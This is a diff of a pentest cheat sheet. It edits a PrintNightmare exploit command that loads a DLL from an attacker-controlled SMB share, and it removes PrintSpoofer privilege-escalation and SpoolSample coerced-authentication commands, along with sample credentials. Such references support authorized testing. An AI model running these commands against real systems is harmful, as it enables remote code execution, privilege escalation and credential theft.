@@ -74,39 +74,5 @@ https://github.com/cube0x0/CVE-2021-1675
 Need a real smb server (not work with the impacket server)
 
 ```
-CVE-2021-1675.py <domain>/<user>:<password>@<target_ip> '\\<attacker_ip>\<share_name>\<dll_name|inject>.dll'
+CVE-2021-1675.py <domain>/<user>:<password>@<rhost> '\\<lhost>\<share_name>\<dll_name|inject>.dll'
 ```
-
-## Printspoofer privesc
-#plateform/windows  #target/local #cat/ATTACK/EXPLOIT
-
-https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET
-
-```
-PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss <launch_cmd>
-```
-
-## Spoolsample launch pipe
-#plateform/windows  #target/remote #cat/ATTACK/EXPLOIT
-```
-SpoolSample.exe <target_hostname> <target_hostname>/pipe/test
-```
-
-## Spoolsample
-#plateform/windows  #target/remote #cat/ATTACK/EXPLOIT
-
-coherced authentitication 
-
-```
-SpoolSample.exe <target_server> <capture_server> 
-```
-
-
-= user : anonymous
-= pass : anonymous
-= computer_name : armoury
-= dc : DC01.domain.local
-= dc1 : DC01.domain.local
-= dc2 : DC02.domain.local
-= computer_password : 123soleil
-= ip_range : 192.168.1.0/24
